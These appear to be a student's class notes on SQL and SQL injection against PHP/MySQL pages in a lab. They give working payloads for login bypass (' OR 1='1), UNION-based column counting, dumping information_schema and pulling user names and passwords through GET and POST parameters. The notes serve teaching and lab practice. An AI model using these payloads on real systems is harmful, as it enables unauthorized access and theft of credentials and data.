# Structured Query Language

# Standard Commands(Use UNION SELECT)
SELECT ***

	Extracts data from a database

UNION ***

	Used to combine the result-set of two or more SELECT statements

USE

	Selects the DB to use

UPDATE

	Updates data in a database

DELETE

	Deletes data from a database

INSERT INTO

	Inserts new data into a database

CREATE DATABASE

	Creates a new database

ALTER DATABASE

	Modifies a database

CREATE TABLE

	Creates a new table

ALTER TABLE

	Modifies a table

DROP TABLE

	Deletes a table

CREATE INDEX

	Creates an index (search key)

DROP INDEX

	Deletes an index


## EX

https://github.com/IanLefcourte/SQL-BOLT/blob/master/Query-Answers.sql



# SQL Injection - Considerations
Requires Valid SQL Queries

Fully patched systems can be vulnerable due to misconfiguration

Input Field Sanitization

String vs Integer Values

Is ***INFORMATION_SCHEMA*** Database available?

GET Request versus POST Request HTTP methods

# Unsanitized vs Sanitized Fields
Unsanitized: input fields can be found using a Single Quote ⇒ '

	Will return extraneous information

	' closes a variable, to allow for additional statements/clauses

	May show no errors or generic error (harder Injection)



Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)



Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')


# Server-Side Query Processing
User enters JohnDoe243 in the name form field and pass1234 in the pass form field.



The Server-Side Query that would be passed to MySQL from PHP would be:



BEFORE INPUT:

	SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;



AFTER INPUT:

	SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;


 # Example - Injecting Your Statement
User enters TOM' OR 1='1 in the name and pass fields.



Truth Statement: tom ' OR 1='1



Server-Side query executed would appear like this:



SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’


## Significance of single quote

There are single quotes on server side by default so in order to bypass that that must artificially close the first server side ' with your own input, then add OR and another single quote to open  the second ' on server.

# See GET and POST req 

Enter in Username and Password

	' OR 1='1

Before entering credentials open developer console on webpage

Press Login

Highlight POST request in the top Network tab and in right pane click on Request tab

Toggle "Raw" option, copy that string and enter it into url, add a ? before raw string

ex.

	(http://10.50.33.78/login.php)  +  (?)  +  (username=Darth_Vader&passwd=%27+OR+1%3D%271)

### Think of DB like MS Excel 

File = Database

Tables are within each file

There are columns within 

 # GOLDEN STATEMENT

 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
               <column>,<column>,<column>			<database>.<table>


 Only gonna look at non-default/user created DB, session

 Syntax of what you are looking for reads from left to right but is opposite of how table reads

 ## In Class DEMO, no creds

 ### Commands

Log Into SQL Server

 	mysql

See DBs

	show databases

 ***information_schema, mysql and performance_schema are the three default DBs for SQL server, we will be mostly concerned with information_schema***

To select and change DB

	use information_schema

See all tables within that DB

	show tables from information_schema ;
 
***Don't need From statement if already in that DB***


See information within table in columns

	show columns from columns ;

 ***Big Three Columns***

 Table_Schema will show all DBs across entire server i.e. information_schema, mysql, performance_schema, session

 Table_Name names of all tables across all DBs across server

 Column_Name show all columns of tables of all DBs across server

 ***Only be worried about Table_Name,Table_Schema,Column_Name as referenced to by Golden Statement***

Will show table_schema,columns table of information_schema 

 	select table_schema from information_schema.columns ;

Will show table_names, from columns table in information_schema

	select table_name from information_schema.columns ;

Selecting all column names from all of the tables within the information_schema DB

 	select column_name from information_schema.columns ;

Query same as golden statement without UNION

	select table_schema,table_name,column_name from information_schema.columns

Selecting from session DB

	select name,cost,year from session.car ;


# Web Page ex

Step. 1 

Interact with page to find vulnerable page by selecting each option paired with ***option***' OR 1='1

When you get results you know it's vulnerable, if no results show check "SHOW QUERY" to see if single quotes are cancelled out

***Click on show query to see "SELECT" statement***

Step. 2

Identify number of columns

***option***' UNION SELECT 1,2,3,4 #

Keep incrementing numbers until you find them


Step 3.

Modify golden statement to include all information and dump the DB

***option***' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #

***When you use the show query it indicates it is looking for 5 fields so you must modify golden statement to look for the 5 fields since our original only includes 3***

Step 4.

Craft Query by Modifying Golden Statement to extract information from DB

 ***option***' UNION SELECT tireid,2,name,size,cost FROM session.Tires #

***columns are case senitive***

Step 5. WIN

# GET METHOD 

Step 1.

Interact with fields to see vulnerability and see format of query

After Selection=3 in url bar add OR 1=1

Step 2.

Identify Columns same as before, after found vulnerable page 

Selection=3 UNION SELECT 1,2,3,4 #

***This showed columns in format of 1,3,2 so keep that in mind when modifying Golden Statment***

Step 3. Modify Golden Statement to dump contents of DB

Selection=3 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns #

Step 4. Extract Info from DB

Selct id, name and pass from user table in session db 

Selection=3 UNION SELECT id,pass,name FROM session.user

Step 5. WIN

# WHERE

Nesting Statements

php?key=<value>UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

# Abuse The Client (GET METHOD)
Passing injection through the URL:

After the .PHP?ITEM=4 pass your UNION statement



prices.php?item=4 UNION SELECT 1,2



prices.php?item=4 UNION SELECT 1,2,@@version



What is @@VERSION?

# Abuse The Client (Enum)
Identifying the schema leads to detailed queries to enumerate the DB



Research Database Schemas and what information they provide



php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()


What are INFORMATION_SCHEMA and DATABASE()?

